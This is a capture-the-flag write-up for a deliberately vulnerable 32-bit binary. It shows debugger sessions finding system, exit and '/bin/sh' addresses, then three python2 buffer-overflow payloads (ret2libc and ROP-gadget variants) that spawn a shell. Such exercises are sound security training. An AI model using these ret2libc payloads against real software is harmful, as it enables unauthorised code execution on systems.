### How to compile binary (turn ASLR off):

`gcc roplevel2.c -o roplevel2 -fno-stack-protector -z execstack -m32 -no-pie -Wl,-z,norelro -mpreferred-stack-boundary=2`

### Analysis:

```
pwndbg> p exit
$1 = {<text variable, no debug info>} 0x8049060 <exit@plt>
pwndbg> p system
$2 = {<text variable, no debug info>} 0x8049050 <system@plt>
```

```
┌──(george93㉿kali)-[~/Desktop/Exploit-Challenges/rop/src]
└─$ strings -a -t x /usr/lib/i386-linux-gnu/libc-2.33.so | grep "/bin/sh"                                                                   
 18fb62 /bin/sh

┌──(george93㉿kali)-[~/Desktop/Exploit-Challenges/rop/src]
└─$ gdb-pwndbg roplevel2
Reading symbols from roplevel2...
(No debugging symbols found in roplevel2)
pwndbg: loaded 192 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
pwndbg> break main
Breakpoint 1 at 0x80491f0
pwndbg> r
Starting program: /home/george93/Desktop/Exploit-Challenges/rop/src/roplevel2 

Breakpoint 1, 0x080491f0 in main ()
...
...
...
pwndbg> info proc mappings
process 5091
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /home/george93/Desktop/Exploit-Challenges/rop/src/roplevel2
	 0x8049000  0x804a000     0x1000     0x1000 /home/george93/Desktop/Exploit-Challenges/rop/src/roplevel2
	 0x804a000  0x804b000     0x1000     0x2000 /home/george93/Desktop/Exploit-Challenges/rop/src/roplevel2
	 0x804b000  0x804c000     0x1000     0x2000 /home/george93/Desktop/Exploit-Challenges/rop/src/roplevel2
	0xf7db9000 0xf7dd6000    0x1d000        0x0 /usr/lib/i386-linux-gnu/libc-2.33.so
	0xf7dd6000 0xf7f2e000   0x158000    0x1d000 /usr/lib/i386-linux-gnu/libc-2.33.so
	0xf7f2e000 0xf7fa1000    0x73000   0x175000 /usr/lib/i386-linux-gnu/libc-2.33.so
	0xf7fa1000 0xf7fa2000     0x1000   0x1e8000 /usr/lib/i386-linux-gnu/libc-2.33.so
	0xf7fa2000 0xf7fa4000     0x2000   0x1e8000 /usr/lib/i386-linux-gnu/libc-2.33.so
	0xf7fa4000 0xf7fa6000     0x2000   0x1ea000 /usr/lib/i386-linux-gnu/libc-2.33.so
	0xf7fa6000 0xf7fad000     0x7000        0x0 
	0xf7fc3000 0xf7fc5000     0x2000        0x0 
	0xf7fc5000 0xf7fc9000     0x4000        0x0 [vvar]
	0xf7fc9000 0xf7fcb000     0x2000        0x0 [vdso]
	0xf7fcb000 0xf7fcc000     0x1000        0x0 /usr/lib/i386-linux-gnu/ld-2.33.so
	0xf7fcc000 0xf7fee000    0x22000     0x1000 /usr/lib/i386-linux-gnu/ld-2.33.so
	0xf7fee000 0xf7ffb000     0xd000    0x23000 /usr/lib/i386-linux-gnu/ld-2.33.so
	0xf7ffb000 0xf7ffd000     0x2000    0x2f000 /usr/lib/i386-linux-gnu/ld-2.33.so
	0xf7ffd000 0xf7ffe000     0x1000    0x31000 /usr/lib/i386-linux-gnu/ld-2.33.so
	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
pwndbg> x/s 0xf7db9000+0x18fb62
0xf7f48b62:	"/bin/sh"
```

```
pwndbg> find &system,+99999999,"/bin/sh"
warning: Unable to access 16007 bytes of target memory at 0x8049050, halting search.
Pattern not found.
pwndbg> break main
Breakpoint 1 at 0x80491f0
pwndbg> c
The program is not being run.
pwndbg> r
Starting program: /home/george93/Desktop/Exploit-Challenges/rop/src/roplevel2
...
...
...
pwndbg> find &system,+99999999,"/bin/sh"
0xf7f48b62
warning: Unable to access 16000 bytes of target memory at 0xf7faa5ea, halting search.
1 pattern found.
```

### Methodolody:

Find gadgets to return to a System Function

### Answer:

Using pure ret2libc:

```
(python2 -c "print('AAAABBBBCCCCDDDDEEEEFFFF' + '\x00\xdd\xdf\xf7\x60\x90\x04\x08\x62\x8b\xf4\xf7')"; cat) | ./roplevel2
```

Using gadget() function:

```
(python2 -c "print('AAAABBBBCCCCDDDDEEEEFFFF' + '\xda\x91\x04\x08\x00\xdd\xdf\xf7\x60\x90\x04\x08\x62\x8b\xf4\xf7')"; cat) | ./roplevel2
```

Using `ROPGadget --binary ./roplevel2` (`0x080492c2 : sub al, 0x24 ; ret`):

```
(python2 -c "print('AAAABBBBCCCCDDDDEEEEFFFF' + '\xc2\x92\x04\x08\x00\xdd\xdf\xf7\x60\x90\x04\x08\x62\x8b\xf4\xf7')"; cat) | ./roplevel2
```

### Notes:

Based on the design of this challenge, the gadget function is not suitable to solve the puzzle as x86 stores parameters to functions on the stack while Mach-O stores parameters to functions in lower registers. I have since edited the challenge to allow it to be exploitable on a Linux OS via the gadget function or finding gadgets within the binary itself as well :). Due to the nature of this exploit, you can even just use a generic ret2libc attack.

### References:

https://icyphox.sh/blog/rop-on-arm/
